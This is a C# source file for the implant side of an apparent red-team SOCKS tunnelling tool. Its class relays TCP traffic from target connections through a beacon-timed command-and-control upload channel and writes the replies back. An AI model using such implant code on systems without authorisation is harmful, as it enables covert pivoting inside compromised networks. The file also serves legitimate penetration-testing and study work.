using ImplantSide.Classes.Comms;
using ImplantSide.Classes.Target;
using ImplantSide.Interfaces;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace SharpSocksImplant.Classes.Socks
{
	public class SocksSocketComms
	{
		public IImplantLog ImplantComms { get; set; }
		public CancellationToken Cancel { get; private set; }
		public ManualResetEvent RecvedData { get; private set; }
		public ManualResetEvent SentData { get; private set; }
		public ConcurrentDictionary<String, TargetInfo> Targets {get; set;}
		public CommandCommunicationHandler CmdCommshandler { get; set; }
		public Int16 BeaconTime { get; set; }
		public Int32 TotalBytesRead { get; private set; }
		public Int32 TotalBytesWritten { get; private set; }
		ManualResetEvent _timeout = new ManualResetEvent(false);
		
		public SocksSocketComms()
		{
			Cancel = new CancellationToken();
			RecvedData = new ManualResetEvent(false);
			SentData = new ManualResetEvent(true);
			Targets = new ConcurrentDictionary<string, TargetInfo>();
		}

		public void AddTarget(String targetId, TargetInfo trgtinfo)
		{
			if (!Targets.ContainsKey(targetId)) 
				Targets.TryAdd(targetId, trgtinfo);
		}
		
		public void RemoveTarget(String targetId)
		{
			if (Targets.ContainsKey(targetId))
				Targets.TryRemove(targetId, out TargetInfo trgtinfo);
		}

		public void ReadFromSocket()
		{
			var arrayBuffer = new byte[512000];
			var bytectr = 0;
			while (!Cancel.IsCancellationRequested)
			{
				foreach (var key in Targets.Keys)
				{
					TargetInfo trget = null;
					try
					{
						if (Targets.ContainsKey(key))
							trget = Targets[key];

						if (!trget.Exit)
						{
							var stream = trget.TargetTcpClient.GetStream();
							if (Cancel.IsCancellationRequested || trget.Exit)
								return;

							if (IsConnected(trget.TargetTcpClient.Client))
							{
								if (stream.CanRead && stream.DataAvailable)
								{
									int ctr = 0;
									bytectr = 0;
									do
									{
										var bytesRead = stream.Read(arrayBuffer, 0, 512000);
										bytectr += bytesRead;
										if (bytesRead > 0)
										{
											TotalBytesRead += bytesRead;
											trget.ReadQueue.Enqueue(arrayBuffer.Take(bytesRead).ToList());
										}
										ctr++;
									} while (!_timeout.WaitOne(10) && stream.CanRead && stream.DataAvailable);
									if (ctr >= 1)
									{
										RecvedData.Set();
										ImplantComms.LogMessage($"[{trget.TargetId}] Socks {trget.TargetTcpClient.Client.RemoteEndPoint.ToString()} read {bytectr} available bytes");
									}
								}
							}
							else
								if (null != trget)
									trget.Exit = true;
							
						}
					}
					catch
					{
						if (null != trget)
							trget.Exit = true;
					}

					if (trget?.Exit ?? true )
					{
						try { if (null != trget?.TargetTcpClient) trget.TargetTcpClient.Close(); }
						catch { /*Dont relly care if exception thrown here*/ }
						if (Targets.ContainsKey(key))
							Targets.TryRemove(key, out TargetInfo tgexit);
						ImplantComms.LogMessage($"[{trget.TargetId}] Connection has been closed");
					}
				}
				_timeout.WaitOne(100);
			}
		}
		
		public void WriteToSocket()
		{
			while (!Cancel.IsCancellationRequested)
			{
				SentData.WaitOne(-1);
				SentData.Reset();
				foreach (var key in Targets.Keys)
				{
					TargetInfo trget = null;
					NetworkStream stream = null;
					try
					{
						if (Targets.ContainsKey(key))
							trget = Targets[key];

						if (null != trget && !trget.Exit)
						{
							stream = trget.TargetTcpClient.GetStream();
							if (trget.WriteQueue.Count > 0)
							{
								var toSend = new List<byte>();
								List<byte> pyld = null;
								while (trget.WriteQueue.Count() > 0)
								{
									trget.WriteQueue.TryDequeue(out pyld);
									if (pyld.Count > 0)
										toSend.AddRange(pyld);
								}
								if (IsConnected(trget.TargetTcpClient.Client))
								{
									if (toSend != null && toSend.Count() > 0)
									{
										TotalBytesWritten += toSend.Count;
										stream.Write(toSend.ToArray(), 0, toSend.Count());
										stream.Flush();
										ImplantComms.LogMessage($"[{trget.TargetId}] Written {toSend.Count()} from client");
									}
								}
								else
									if (null != trget)
										trget.Exit = true;
							}
						}
					}
					catch
					{
						if (null != trget)
							trget.Exit = true;
					}

					if (!trget?.TargetTcpClient?.Connected ?? false || (trget?.Exit ?? true))
					{
						try { if (null != stream) stream.Close(); }
						catch { /*Dont relly care if exception thrown here*/ }

						try { if (null != trget?.TargetTcpClient) trget.TargetTcpClient.Close();}
						catch { /*Dont relly care if exception thrown here*/ }
						if (Targets.ContainsKey(key))
							Targets.TryRemove(key, out TargetInfo tgexit);
						ImplantComms.LogMessage($"[{trget.TargetId}] Connection has been closed");
					}
				}		
			}
		}

		public void SendToTarget()
		{
			var SendWait = new ManualResetEvent(false);
			while (!Cancel.IsCancellationRequested)
			{
				RecvedData.WaitOne(-1); ;
				RecvedData.Reset();
				foreach (var key in Targets.Keys)
				{
					TargetInfo trget = null;
					try
					{
						if (Targets.ContainsKey(key))
							trget = Targets[key];

						if (null != trget && !trget.Exit)
						{
							List<byte> readPyld = null;

							var payload = new List<byte>();
							while (trget.ReadQueue.Count > 0)
							{
								trget.ReadQueue.TryDequeue(out readPyld);
								payload.AddRange(readPyld);
							}
							if (payload.Count > 0)
							{
								Task.Factory.StartNew(() =>
								{
									List<byte> toSend = null;
									try
									{
										toSend = CmdCommshandler.Send(trget, "asyncUpload", payload, out bool connectionDead);
										ImplantComms.LogMessage($"[{trget.TargetId}] Received {toSend?.Count() ?? 0} bytes after sending {payload?.Count ?? 0 } bytes");
										if (null == toSend || connectionDead)
										{
											ImplantComms.LogError($"[{trget.TargetId}] Connection looks dead EXITING");
											trget.Exit = true;
										}
										else if (toSend.Count > 0)
										{
											trget.WriteQueue.Enqueue(toSend);
											SentData.Set();
										}
									}
									catch 
									{
										trget.Exit = true;
										ImplantComms.LogError($"[{trget.TargetId}] Couldn't send {toSend?.Count()} bytes");
									}
								});
								ImplantComms.LogMessage($"[{trget.TargetId}] {payload?.Count() ?? 0} bytes arrived from target about to send back");
							}
						}
						SendWait.WaitOne(BeaconTime);
					}
					catch (Exception ex)
					{
						if (null != trget)
							trget.Exit = true;
						ImplantComms.LogError($"[{trget.TargetId}] Error during Send Data loop {ex}");
					}
				}
			}
		}

		static bool IsConnected(Socket client)
		{
			if (client.Connected)
			{
				if ((client.Poll(0, SelectMode.SelectWrite)) && (!client.Poll(0, SelectMode.SelectError)))
					return true;
				else
					return false;
			}
			else
				return false;
		}
	}
}
